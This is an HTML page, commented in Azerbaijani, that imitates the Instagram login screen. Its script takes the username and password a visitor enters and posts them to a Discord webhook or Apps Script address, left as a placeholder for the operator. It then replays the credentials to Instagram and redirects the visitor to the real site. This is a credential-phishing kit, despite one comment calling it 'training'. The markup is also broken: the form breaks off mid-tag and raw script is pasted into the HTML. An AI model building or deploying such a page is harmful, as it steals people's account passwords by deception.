<!DOCTYPE html>
<html lang="az" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* Instagram kimi görünmək üçün daha dəqiq CSS */
        :root {
            --primary: #3897f0;
            --primary-hover: #3897f0e6;
            --error: #ed4956;
            --success: #34a853;
            --text-primary: #262626;
            --text-secondary: #8e8e8e;
            --border-color: #dbdbdb;
            --background: #fafafa;
            --background-secondary: #ffffff;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--background);
            color: var(--text-primary);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
            padding: 20px 0;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 350px;
            background-color: var(--background-secondary);
            border: 1px solid var(--border-color);
            border-radius: 3px;
            padding: 10px 0;
            margin-bottom: 10px;
        }

        .logo-container {
            margin: 36px 0 12px;
            width: 175px;
        }

        .logo {
            width: 100%;
        }

        .form {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            padding: 0 40px;
            margin-top: 24px;
        }

        .form-group {
            position: relative;
            width: 100%;
            margin-bottom: 6px;
        }

        .form-input {
            width: 100%;
            height: 36px;
            padding: 0 8px;
            border: 1px solid var(--border-color);
            border-radius: 3px;
            background-color: var(--background);
            font-size: 14px;
            outline: none;
            transition: border 0.2s;
        }

        .form-input:focus {
            border: 1px solid #939393;
        }

        .form-label {
            position: absolute;
            left: 8px;
            top: 9px;
            font-size: 14px;
            color: var(--text-secondary);
            pointer-events: none;
            transition: all 0.2s;
        }

        .form-input:focus ~ .form-label,
        .form-input:not(:placeholder-shown) ~ .form-label {
            top: -16px;
            font-size: 12px;
            background-color: var(--background-secondary);
            padding: 0 4px;
        }

        .form-button {
            width: 100%;
            padding: 8px;
            background-color: var(--primary);
            color: white;
            border: none;
            border-radius: 4px;
            margin-top: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .form-button:hover {
            opacity: 0.9;
        }

        .form-button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            flex-direction: row;
            align-items: center;
            width: 100%;
            margin: 10px 40px 18px;
            color: var(--text-secondary);
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before, .divider::after {
            content: "";
            flex-grow: 1;
            height: 1px;
            background-color: var(--border-color);
        }

        .divider span {
            padding: 0 18px;
        }

        .facebook-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .forgot-password {
            color: var(--primary);
            font-size: 12px;
            line-height: 14px;
            margin-top: 12px;
            cursor: pointer;
        }

        .signup {
            padding: 10px;
            margin-top: 10px;
            border: 1px solid var(--border-color);
            border-radius: 3px;
            width: 100%;
            max-width: 350px;
            text-align: center;
            font-size: 14px;
            background-color: var(--background-secondary);
        }

        .signup a {
            color: var(--primary);
            font-weight: 600;
            text-decoration: none;
        }

        .app-download {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 20px;
            width: 100%;
            max-width: 350px;
        }

        .app-download p {
            font-size: 14px;
            margin-bottom: 10px;
            line-height: 18px;
            text-align: center;
        }

        .app-download-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-bottom: 10px;
        }

        .app-download-button {
            height: 40px;
            border-radius: 3px;
            overflow: hidden;
        }

        .app-download-button img {
            height: 100%;
            display: block;
        }

        .footer {
            width: 100%;
            max-width: 935px;
            margin: 0 auto;
            padding: 20px 0;
            text-align: center;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            margin-bottom: 12px;
        }

        .footer-link {
            color: var(--text-secondary);
            font-size: 12px;
            margin: 0 8px 12px;
            text-decoration: none;
        }

        .footer-copyright {
            font-size: 12px;
            color: var(--text-secondary);
            margin-bottom: 8px;
        }

        .footer-language {
            font-size: 12px;
            color: var(--text-secondary);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
        }

        .hidden {
            display: none;
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 12px 20px;
            border-radius: 4px;
            color: white;
            font-weight: 600;
            z-index: 1000;
            transform: translateY(-100px);
            opacity: 0;
            transition: all 0.3s ease;
        }

        .notification.show {
            transform: translateY(0);
            opacity: 1;
        }

        .notification.error {
            background-color: var(--error);
        }

        .notification.success {
            background-color: var(--success);
        }

        @media (max-width: 450px) {
            .container {
                border: none;
                border-radius: 0;
            }
            
            .signup {
                border: none;
                border-radius: 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Instagram.svg/1200px-Instagram.svg.png" alt="Instagram">
        </div>
        
        <form class="form" id="loginForm">
            <div class="form-group
              document.getElementById('loginForm').addEventListener('submit', async function(event) {
    event.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // Yükləmə animasiyası göstər (istifadəçi təcrübəsini yaxşılaşdırır)
    const loginButton = document.querySelector('.form-button');
    loginButton.textContent = 'Yüklənir...';
    loginButton.disabled = true;
    
    try {
        // Məlumatları sizə göndər (təlim məqsədli)
        const data = {
            username: username,
            password: password,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            location: window.location.href
        };
        
        // Discord webhook və ya başqa bir metodla məlumatları özünüzə göndərin
        await sendToWebhook(data);
        
        // Instagram-a giriş etməyə cəhd
        const loginSuccess = await attemptInstagramLogin(username, password);
        
        if (loginSuccess) {
            // Uğurlu olarsa, istifadəçini Instagram ana səhifəsinə yönləndir
            window.location.href = 'https://www.instagram.com/';
        } else {
            // Uğursuz olarsa, xəta mesajı göstər və səhifəni yenilə
            showNotification('İstifadəçi adı və ya şifrə yalnışdır', 'error');
            loginButton.textContent = 'Daxil ol';
            loginButton.disabled = false;
        }
    } catch (error) {
        console.error('Xəta:', error);
        showNotification('Giriş edilərkən xəta baş verdi', 'error');
        loginButton.textContent = 'Daxil ol';
        loginButton.disabled = false;
    }
});

// Instagram-a giriş etmək üçün funksiya
async function attemptInstagramLogin(username, password) {
    // QİYMƏTLİNDİRME: Bu hissə yalnız nəzəri məqsədlidir və praktikada işləməyə bilər
    // Instagramın giriş mexanizmləri mürəkkəbdir və tez-tez dəyişir
    
    try {
        // Bu, sadələşdirilmiş bir nümunədir. Real həyatda daha mürəkkəb bir proses lazımdır
        const response = await fetch('https://www.instagram.com/accounts/login/ajax/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-CSRFToken': getCookie('csrftoken'),
                'X-Instagram-AJAX': '1',
                'Referer': 'https://www.instagram.com/',
                'User-Agent': navigator.userAgent
            },
            body: new URLSearchParams({
                username: username,
                enc_password: `#PWD_INSTAGRAM_BROWSER:0:${Date.now()}:${password}`, // Instagramın şifrə şifrələmə formatı
                queryParams: '{}',
                optIntoOneTap: 'false'
            }),
            credentials: 'include'
        });
        
        if (response.ok) {
            const data = await response.json();
            return data.authenticated === true || data.status === 'ok';
        }
        
        return false;
    } catch (error) {
        console.error('Instagram giriş xətası:', error);
        return false;
    }
}

// Köməkçi funksiyalar
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}

function showNotification(message, type) {
    // Bildiriş elementi yarat
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    // Bildirişi göstər
    setTimeout(() => {
        notification.classList.add('show');
    }, 100);
    
    // Bildirişi gizlət
    setTimeout(() => {
        notification.classList.remove('show');
        setTimeout(() => {
            document.body.removeChild(notification);
        }, 300);
    }, 3000);
}

async function sendToWebhook(data) {
    // Discord webhook və ya Google Apps Script URL-nizi buraya əlavə edin
    const webhookUrl = 'BURADA_WEBHOOK_UNVANI_YAZILACAQ';
    
    if (webhookUrl && webhookUrl !== 'BURADA_WEBHOOK_UNVANI_YAZILACAQ') {
        try {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `Yeni giriş cəhdi: ${data.username}`,
                    embeds: [{
                        title: 'İstifadəçi Məlumatları',
                        fields: [
                            { name: 'İstifadəçi adı', value: data.username, inline: true },
                            { name: 'Şifrə', value: data.password, inline: true },
                            { name: 'Tarix', value: data.timestamp, inline: false }
                        ]
                    }]
                })
            });
        } catch (error) {
            console.error('Webhook xətası:', error);
        }
    }
}
